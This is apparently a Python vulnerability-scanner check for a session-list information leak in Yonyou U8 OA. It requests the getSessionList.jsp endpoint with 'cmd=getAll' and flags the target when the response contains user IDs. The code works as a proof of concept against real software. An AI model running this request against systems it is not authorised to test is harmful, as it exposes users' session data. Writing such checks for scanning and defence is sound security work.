from poc import core

def check_getSessionList(url):
    name = '用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞'
    core.start_echo(name)
    path = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    r = core.get(url, path)
    if r:
        if "usrID" in r.text:
            core.end_echo(name, 'Payload：' + url + path)
            core.result(name, 'Payload：' + url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)